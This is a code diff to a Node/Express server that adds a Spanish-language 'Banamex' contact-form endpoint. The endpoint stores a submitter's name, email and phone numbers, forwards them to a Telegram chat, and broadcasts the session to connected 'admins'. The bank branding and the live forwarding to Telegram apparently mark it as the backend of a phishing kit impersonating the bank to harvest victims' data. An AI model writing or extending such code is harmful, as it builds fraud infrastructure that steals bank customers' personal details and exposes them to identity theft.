@@ -819,6 +819,49 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  app.post('/api/banamex/contact', async (req, res) => {
+    try {
+      const { sessionId, nombreContacto, correoContacto, celularContacto, telefonoAlternativoContacto } = req.body;
+
+      if (!sessionId || !nombreContacto || !correoContacto || !celularContacto) {
+        return res.status(400).json({ message: "Todos los campos requeridos deben ser completados" });
+      }
+
+      const session = await storage.updateSession(sessionId, { 
+        nombreContacto,
+        correoContacto,
+        celularContacto,
+        telefonoAlternativoContacto: telefonoAlternativoContacto || '',
+      });
+
+      console.log(`[Banamex Contact] Formulario de contacto recibido - Session: ${sessionId}`);
+
+      const telegramMessage = 
+        `📋 <b>Formulario de Contacto - Banamex</b>\n\n` +
+        `👤 <b>Nombre:</b> ${nombreContacto}\n` +
+        `📧 <b>Correo:</b> ${correoContacto}\n` +
+        `📱 <b>Celular:</b> ${celularContacto}\n` +
+        (telefonoAlternativoContacto ? `☎️ <b>Teléfono Alternativo:</b> ${telefonoAlternativoContacto}\n` : '') +
+        `🆔 <b>Session ID:</b> ${sessionId}\n` +
+        `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+
+      await sendTelegramMessage(telegramMessage);
+
+      broadcastToAdmins(JSON.stringify({
+        type: 'SESSION_UPDATE',
+        data: session
+      }));
+
+      res.json({ 
+        success: true, 
+        message: "Datos de contacto recibidos correctamente" 
+      });
+    } catch (error) {
+      console.error("Error en formulario de contacto de Banamex:", error);
+      res.status(500).json({ message: "Error procesando formulario de contacto" });
+    }
+  });
+
   app.post('/api/sessions/:id/update', async (req, res) => {
     try {
       const { id } = req.params;
